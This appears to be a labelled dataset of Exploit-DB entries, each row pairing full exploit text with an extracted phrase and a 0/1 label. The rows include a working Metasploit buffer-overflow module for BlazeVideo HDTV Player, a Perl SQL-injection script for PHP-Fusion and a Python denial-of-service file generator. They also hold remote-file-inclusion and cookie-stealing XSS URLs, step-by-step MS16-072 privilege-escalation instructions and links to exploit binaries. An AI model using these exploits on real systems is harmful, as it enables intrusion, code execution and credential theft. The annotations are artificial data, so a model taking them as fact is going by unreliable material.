23052,"BlazeVideo HDTV Player Pro 6.6 - Filename Handling (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::FILEFORMAT 	include Msf::Exploit::Remote::Seh  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""BlazeVideo HDTV Player Pro v6.6 Filename Handling Vulnerability"", 			'Description'    => %q{ 					This module exploits a vulnerability found in BlazeVideo HDTV Player's filename 				handling routine.  When supplying a string of input data embedded in a .plf file, 				the MediaPlayerCtrl.dll component will try to extract a filename by using 				PathFindFileNameA(), and then copies whatever the return value is on the stack by 				using an inline strcpy.  As a result, if this input data is long enough, it can cause 				a stack-based buffer overflow, which may lead to arbitrary code execution under the 				context of the user. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'b33f',   #Original 					'sinn3r'  #Metasploit 				], 			'References'     => 				[ 					['OSVDB', '80896'], 					['EDB', '18693'], 					['EDB', '22931'] 				], 			'Payload'        => 				{ 					'BadChars'        => ""\x00\x0a\x1a\x2f\x3a\x5c"", 					'StackAdjustment' => -3500 				}, 			'DefaultOptions'  => 				{ 					'ExitFunction' => ""seh"" 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					# MediaPlayerCtrl.dll P/P/R 					# Tested on: Windows 7 SP1/SP0, Windows XP SP3 / Windows Vista SP2/SP1/SP0 					['BlazeVideo HDTV Player Pro v6.6.0.3', {'Ret'=>0x64020327, 'Offset'=>868}] 				], 			'Privileged'     => false, 			'DisclosureDate' => ""Apr 03 2012"", 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptString.new('FILENAME', [ false, 'The file name.', 'msf.plf']) 			], self.class) 	end  	def exploit 		buf = 'http://' 		buf << rand_text_alpha_upper(target['Offset']) 		buf << generate_seh_record(target.ret) 		buf << payload.encoded 		buf << rand_text_alpha(5000-buf.length)  		print_status(""Creating '#{datastore['FILENAME']}'..."") 		file_create(buf) 	end end  =begin Version: HDTV Player Professional v6.6  In MediaPlayerCtrl.dll (File version: 2.0.0.2; Product version: 2.0.0.2) .text:6400E574                 mov     eax, [esp+138h+Source] .text:6400E578                 mov     edx, [ebp+0ECh] .text:6400E57E                 push    eax .text:6400E57F                 push    eax             ; pszPath  <-- Our URL .text:6400E580                 mov     edi, [edx] .text:6400E582                 call    ebx ; PathFindFileNameA .text:6400E584                 mov     ecx, [ebp+0ECh] .text:6400E58A                 push    eax             ; File path to copy .text:6400E58B                 push    esi .text:6400E58C                 push    1 .text:6400E58E                 call    dword ptr [edi] ; 0x6400f1f0  0x6400F1F0 (no length check either) goes down to 0x6400F670:  int __thiscall sub_6400F670(int this, int a2, int a3, const char *source, const char *a5) {   ...    v5 = this;   if ( a2 && source && a5 )   {     memset(&buffer, 0, '\x02\x10');     v16 = *(this + 4);     *(this + 4) = v16 + 1;     v18 = a3;     buffer = a2;     strcpy(&Dest2, source);  // <-- This is a rep movs =end",using an inline strcpy,1
23878,"HP Web Jetadmin 7.5.2456 - Printer Firmware Update Script Arbitrary File Upload source: https://www.securityfocus.com/bid/9971/info  HP Web Jetadmin is prone to an issue which may permit remote users to upload arbitrary files to the management server.   This issue exists in the printer firmware update script. Given the ability to place arbitrary files on the server to an attacker-specified location, it may be possible to execute arbitrary code, though this will require exploitation of other known vulnerabilities, such as BID 9972 ""HP Web Jetadmin setinfo.hts Script Directory Traversal Vulnerability"".  Authentication, if it has been enabled, would be required to exploit this issue.  This issue was reported in HP Web Jetadmin version 7.5.2546 on a Windows platform. Other versions may be similarly affected.  https://www.example.com:8443/plugins/hpjwja/script/devices_update_printer_fw_upload.hts",a malicious link,1
40219,"Microsoft Windows 7 (x86/x64) - Group Policy Privilege Escalation (MS16-072) # Exploit Title: Group Policy Elevation of Privilege Vulnerability # Date: 08-08-2016 # Exploit Author: Nabeel Ahmed # Tested on: Windows 7 Professional (x32/x64) # CVE : CVE-2016-3223 # Category: Privilege Escalation  SPECIAL CONFIG: Standard Domain Member configuration with valid credentials. (Standard Domain User with valid credentials) SUMMARY: This vulnerability allows an attacker to create/modify local Administrator account through a fake Domain Controller by creating User Configuration Group Policies.  1) Prerequisites: 			- Standard Windows 7 Fully patched and member of an existing domain. (e.g. domain.local) 			- Domain User Credentials are known with no Administrative rights. 			- Computer has to be connected on a network. 			- Fake Domain Controller 			 2) Reproduce: 	STEP 1: Determine domain of the target computer (e.g. domain.local) 	STEP 2: Boot system and determine FQDN of the device. (example. CLIENT.domain.local), this can be obtained by monitoring the network broadcast communication, which the system sends prior to loggin in. The username can be extracted from the loginscreen (E.g USER1) 	STEP 3: Create Active Directory for the domain you obtained in STEP 2 (domain.local). 	STEP 4: Create User with similar name and password as the target computer. (E.g. domain\USER1:password123!). 	STEP 5: Login on the target system with the known Username and Password without any network connection (using cached credentials). 	STEP 6: Establish network connection between the target system and the newly created Domain Controller. 	STEP 7: Create a Group Policy called ""Create Local Admin"" 	STEP 8: Edit the ""Create Local Admin"" Group Policy to create in the User Configuration section a new user called ""TestAdmin"" and add him to the group ""Administrators"". 	STEP 9: Open Command Prompt on the target system and execute the following command: ""gpupdate /target:user /force"" 	STEP 10: User Policy update will complete successfully. 	STEP 11: Confirm the newly created Administrator ""TestAdmin"" by executing the following command in Command Prompt: ""net localgroup Administrators"" 	STEP 12: ""TestAdmin"" user will be member of the Administrators group. 	 3) Impact: 	A regular Domain User can gain higher privileges on his system by creating a new administrator through Group Policies created on a fake Domain Controller  4) Solution: 	Install the latest patches from 14-06-2016 using Windows Update.  5) References: 	https://technet.microsoft.com/en-us/library/security/ms16-072.aspx 	https://support.microsoft.com/en-us/kb/3163622  6) Credits: 	Vulnerability discovered by Nabeel Ahmed (https://twitter.com/NabeelAhmedBE) and  Tom Gilis (https://twitter.com/tgilis) of Dimension Data (https://www.dimensiondata.com)",creating User Configuration Group Policies,1
30092,FlashChat F_CMS 4.7.9 - Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/24190/info  FlashChat is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input to the application.  An attacker may leverage these issues to execute an arbitrary remote file containing malicious script code in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system. Other attacks are also possible.  This issue affects FlashChat 4.7.9; other versions may also be vulnerable.  Further reports suggest that the vulnerable parameter is defined with static content. This BID will be updated pending further investigation.   http://www.example.com/chat/incclasses/connection.php?f_cms=[Shell-Attack] http://www.example.com/chat/inc/common.php?f_cms=[Shell-Attack],execute an arbitrary remote file containing malicious script code in the context of the webserver process,1
14713,"Abyssal Metal Player 2.0.9 - Denial of Service # Exploit Title: Abyssal Metal Player 2.0.9 DoS # Date: 23/08/2010 # Author: 41.w4r10r # Version: 2.0.9  #Tested on : Windows XP SP2 Eng # Software Link: http://www.abyssalsoft.com/files/download.php?id=15  #!/usr/bin/python #Abyssal Metal Player is Media File Player which Plays many Media Files such as .Mp3 , .avi, .mov, .mpg, .wav. # This vulnerability is found in playing avi file format. print ""--------------------Exploit By 41.w4r10r------------------------------\n"" print ""-------------------41.w4r10r@gmail.com-----------------------------\n"" print ""----------------Abyssal Metal Player 2.0.9------------------------------\n"" print ""-------------Vendor Site : www.abyssalsoft.com-------------------------\n"" print ""-------------Tested on Windows XP Sp2 Eng--------------------\n"" print ""Greets:B0nd, nEo, Godwin_Austin, Fb1H2s, Eberly, Punter, The_Empty(), DZZ, Micr0 \n \n"" print ""  Catch Us :  www.Garahe4hackers.com | www.Andhrahackers.com | www.ICW.in \n \n""  print ""Give Me 10Sec To create file :) \n"" junk = ""A"" * 50000000; filename = ""GetDoSed.avi""; file = open(filename,""w"") file.writelines(junk) file.close() print ""File Is created"" print ""open file in player then press ok when asked now even ctrl+alt+del will not work"" print ""Recomandation : Save all working Data b4 launching exploit :P"" print ""Press Any Key To Continue.........""  raw_input()",a specially crafted .avi file,1
1385,"PHP-Fusion 6.00.3 - 'rating' SQL Injection #!/usr/bin/perl #Exploit for PHP-Fusion 6.00.3 Released #Coded by:krasza[krasza@gmail.com] #Greetz: http://www.curityreason.com use strict; use warnings; use LWP::UserAgent; use HTTP::Cookies; if(!$ARGV[3]){ print<<EOF; Exploit for PHP-Fusion 6.00.3 Released Coded by krasza Contact me:krasza\@gmail.com Greets: -http://www.ecurityreason.com -http://www.revival.pl -mulander  Usage: perl phpfusion.pl url login pass sql url-url hack site with [php fusion's directory] login-your login pass-your password sql-[sql code] Example: \t perl phpfusion.pl http://www.something.com/php-fusion admin password 3','31337','HACKED')/* EOF exit; } my $url=shift; my $login=shift; my $haslo=shift; my $sql=shift; $url=$url.""/news.php?readmore=1""; my $ua = new LWP::UserAgent; $ua->agent(""Exploit for PHP-Fusion"" . $ua->agent); $ua->cookie_jar( HTTP::Cookies->new( 'file' => 'ciasteczka.txt', 'autosave' => 1,)); print ""[+]Connecting to $url...\n"";  my $zadanie = new HTTP::Request POST => $url; $zadanie->content_type('application/x-www-form-urlencoded'); $zadanie->content('user_name=' . $login . '&user_pass=' . $haslo . '&login=Loguj' ); my $wynik = $ua->request($zadanie); if ($wynik->is_success){ print ""[+]Connected to $url\n""; #LOGIN JEST PRAWIDLOWE }else{ print ""[-]Connected failed to $url\n""; print ""[-]Error:"".$wynik->message.""\n""; exit; } print ""[+] Logging In $url...\n""; $zadanie = new HTTP::Request POST => $url; $zadanie->content_type('application/x-www-form-urlencoded'); $zadanie->content('rating='.$sql.'&post_rating=Dodaj+ocen%EA'); my $wynik2 = $ua->request($zadanie); if ($wynik2->is_success){ print ""[+] Sql query isn't done!\n""; }else{ print ""[-]Sql query is done\n""; }  # milw0rm.com [2005-12-23]",a specially crafted .pl file,1
3746,"Microsoft Windows - DNS RPC Remote Buffer Overflow (2)   Exploit v2 features:   - Target Remote port 445 (by default but requires auth)   - Manual target for dynamic tcp port (without auth)   - Automatic search for dynamic dns rpc port   - Local and remote OS fingerprinting (auto target)   - Windows 2000 server and Windows 2003 server (Spanish) supported by default   - Fixed bug with Windows 2003 Shellcode   - Universal local exploit for Win2k (automatic search for opcodes)   - Universal local and remote exploit for Win2k3 (/GS bypassed only with DEP disabled)   - Added targets for remote win2k English and italian (not tested, found with metasploit opcode database. please report your owns)   - Microsoft RPC api used ( who cares? :p )   D:\ProgramaciÃƒÂ³n\DNSTEST>dnstest  --------------------------------------------------------------  Microsoft Dns Server local & remote RPC Exploit code  Exploit code by Andres Tarasco & Mario Ballano  Tested against Windows 2000 server SP4 and Windows 2003 SP2  --------------------------------------------------------------   Usage:   dnstest -h 127.0.0.1 (Universal local exploit)           dnstest -h host [-t id] [-p port]  Targets:       0 (0x30270b0b) - Win2k3 server SP2 Universal - (default for win2k3)       1 (0x79467ef8) - Win2k  server SP4 Spanish -   (default for win2k )       2 (0x7c4fedbb) - Win2k  server SP4 English       3 (0x7963edbb) - Win2k  server SP4 Italian       4 (0x41414141) - Windows all Denial of Service   D:\ProgramaciÃƒÂ³n\DNSTEST>dnstest.exe -h 192.168.1.2  --------------------------------------------------------------  Microsoft Dns Server local & remote RPC Exploit code  Exploit code by Andres Tarasco & Mario Ballano  Tested against Windows 2000 server SP4 and Windows 2003 SP2  --------------------------------------------------------------  [+] Trying to fingerprint target.. (05.02) [+] Remote Host identified as Windows 2003 [-] No port selected. Trying Ninja sk1llz [+] Binding to ncacn_ip_tcp: 192.168.1.2 [+] Found 50abc2a4-574d-40b3-9d66-ee4fd5fba076 version 5.0 [+] RPC binding string: ncacn_ip_tcp:192.168.1.2[1105] [+] Dynamic DNS rpc port found (1105) [+] Connecting to 50abc2a4-574d-40b3-9d66-ee4fd5fba076@ncacn_ip_tcp:192.168.1.2[1105] [+] RpcBindingFromStringBinding success [+] Sending Exploit code to DnssrvOperation() [+] Now try to connect to port 4444   also available at  http://514.es/Microsoft_Dns_Server_Exploit_v2.1.zip http://www.48bits.com/exploits/dnsxpl.v2.1.zip  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/3746.zip (04172007-dnsxpl.v2.1.zip)  # milw0rm.com [2007-04-18]",malicious people,1
23246,"SumatraPDF 2.1.1/MuPDF 1.0 - Integer Overflow Sumatra 2.1.1/MuPDF 1.0 Integer Overflow =======================================  There is an integer overflow on the MuPDF in the lex_number() function which can be triggered using a corrupt PDF file with ObjStm.  I'm attaching a file that reproduces the problem with the original unmodified file. The ObjStm was modified to include big numbers.  The easy way to fix is to update to the latest version of MuPDF library.  Affected products =================  MuPDF 1.0 (previous release) MuPDF for iOS 1.1 (current release) Sumatra 2.1.1 (current stable release)  Fixed =====  MuPDF 1.1 http://git.ghostscript.com/?p=mupdf.git;a=commitdiff;h=f919270b6a732ff45c3ba2d0c105e2b39e9c9bc9 Sumatra Pre-release version: http://blog.kowalczyk.info/software/sumatrapdf/prerelease.html  CVE ==== CVE-2012-5340  Flaw details ============  On the FIXME line occurs an integer overflow, which can be later abused to write to memory:  File: pdf_lex.c static int lex_number(fz_stream *f, pdf_lexbuf *buf, int c) {         .....          while (1)         {                 int c = fz_read_byte(f);                 switch (c)                 {                 case '.':                         goto loop_after_dot;                 case RANGE_0_9:                         i = 10*i + c - '0';                         /* FIXME: Need overflow check here; do we care? */                         break;                 default:                         fz_unread_byte(f);                         /* Fallthrough */                 case EOF:                         if (neg)                                 i = -i;                         buf->i = i;                         return PDF_TOK_INT;                 }         }        ....   file: pdf_repair.c static void pdf_repair_obj_stm(pdf_document *xref, int num, int gen) {       ....          for (i = 0; i < count; i++)         {                 tok = pdf_lex(stm, &buf);                 if (tok != PDF_TOK_INT)                         fz_throw(ctx, ""corrupt object stream (%d %d R)"", num, gen);                  n = buf.i; // n can take negative values when an integer overflow occurs                 if (n >= xref->len)                         pdf_resize_xref(xref, n + 1);                  xref->table[n].ofs = num; // Writes                 xref->table[n].gen = i;                 xref->table[n].stm_ofs = 0;  POC ==== Attached proof of concept. https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/23246.tar.gz  !Exploitable output ===================  MuPDF:  Description: User Mode Write AV Short Description: WriteAV Exploitability Classification: EXPLOITABLE Recommended Bug Title: Exploitable - User Mode Write AV starting at mupdf+0x000000000003e1a6 (Hash=0x0e1a1f61.0x5f702654)  User mode write access violations that are not near NULL are exploitable.  Sumatra:  SumatraPDF!pdf_repair_obj_stms+0x94 SumatraPDF!pdf_open_document_with_stream+0x2c3 SumatraPDF!PdfEngineImpl::LoadFromStream+0xaa SumatraPDF!PdfEngineImpl::Load+0x179 SumatraPDF!PdfEngine::CreateFromFile+0x80 SumatraPDF!EngineManager::CreateEngine+0x82 SumatraPDF!LoadDocIntoWindow+0x266 SumatraPDF!LoadDocumentOld+0x41f SumatraPDF!LoadDocument+0xc SumatraPDF!LoadOnStartup+0x89 SumatraPDF!WinMain+0x57c SumatraPDF!__tmainCRTStartup+0x142 SumatraPDF!WinMainCRTStartup+0xf kernel32!BaseThreadInitThunk+0x12 ntdll32!RtlInitializeExceptionChain+0x63 ntdll32!RtlInitializeExceptionChain+0x36 Instruction Address: 0x00000000775315de  Description: User Mode Write AV Short Description: WriteAV Exploitability Classification: EXPLOITABLE Recommended Bug Title: Exploitable - User Mode Write AV starting at ntdll32!ZwRaiseException+0x0000000000000012 (Hash=0x16621b14.0x14396738)  User mode write access violations that are not near NULL are exploitable.",file,0
24348,"eNdonesia 8.3 - Search Form Cross-Site Scripting source: https://www.securityfocus.com/bid/10856/info  It is reported that eNdonesia is susceptible to a cross-site scripting vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated web content.  As a result of this vulnerability, it is possible for a remote attacker to create a malicious link containing script code that will be executed in the browser of a legitimate user. Specifically the attacker can pass malicious HTML code as a value for the affected URI parameter supplied to 'mod.php'. All code will be executed within the context of the website running the vulnerable software.  This may allow for theft of cookie-based authentication credentials and other attacks.   Version 8.3 of the software is reported vulnerable. Other versions may also be affected.  http://www.example.com/mod.php?mod=publisher&op=search&query=%3Cscript%3Ealert(document.cookie)%3C/script%3E",create a malicious link containing script code that will be executed in the browser of a legitimate user,1
